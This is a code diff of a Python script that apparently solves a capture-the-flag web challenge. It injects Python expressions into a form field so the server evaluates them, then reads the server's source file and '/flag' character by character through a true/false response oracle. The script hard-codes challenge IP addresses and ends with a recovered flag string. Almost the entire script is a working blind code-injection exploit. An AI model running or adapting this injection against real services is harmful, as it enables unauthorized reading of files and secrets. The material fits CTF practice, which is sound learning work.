@@ -7,9 +7,16 @@ import string
 import time
 import zlib
 
+result = []
 # 继承HTMLParser
 class MyHTMLParser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.i = None
+        self.flag = False
 
+    def set_i(self, d):
+        self.i = d
     # def handle_starttag(self, tag, attrs):
     #     print('<%s>' % tag)
     #
@@ -23,9 +30,14 @@ class MyHTMLParser(HTMLParser):
     def handle_data(self, data):
         # html标签内的data
         # print(data)
-        if data == 'Congratulations':
+        if data == 'Result: True':
             # 猜测成功，网页会返回 Congratulations
             # print('ok')
+            global result
+            result.append(self.i)
+            # print(self.i)
+            self.flag = True
+
             print(data + "===========================================================================")
             # exit()
 
@@ -78,18 +90,29 @@ def getCookie(url, data=None, index=None):
 
     # 构造请求参数
     post_data = dict()
-    post_data['input'] = json_question['question'][:-1] + f"-1+(open('./app.py', 'r').read()[{index}] == str('{data}'))"
+    post_data['input'] = json_question['question'][:-1] + f"-1+(next(open('/flag','r'))[:40] == str('{data}'))"
     # print(f"提交的数据：{post_data['input']}")
+    # 提交请求
     html = session_p.post(url, headers=Hostreferer, verify=False, data=post_data)
     # print(html.text)
     return html.text
 
 
 parser = MyHTMLParser()
-print(len(string.printable))
+# print(len(string.printable))
+# mylist = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}0123456789""'
+mylist = 'abcdefghijklmnopqrstuvwxyz}0123456789""'
 # parser.feed(getCookie('http://183.129.189.60:10061', index=5, data=' '))
-for j in range(5):
-    for i in string.printable:
-        # time.sleep(1)
-        print(i)
-        parser.feed(getCookie('http://183.129.189.60:10026', data=i, index=j))
+# for j in range(28, 42):
+#     for i in mylist:
+#         # time.sleep(1)
+#         # print(i)
+#         parser.set_i(i)
+#         parser.feed(getCookie('http://183.129.189.60:10027', data=i, index=j))
+#         time.sleep(0.3)
+#         if parser.flag:
+#             print(f'当前索引{j},字符{i}')
+#             parser.flag = False
+#             break
+
+parser.feed(getCookie('http://183.129.189.60:10027', data='DASCTF{1cd78b58153d9ef4a7da1f5ca15ef7e8}', index=0))
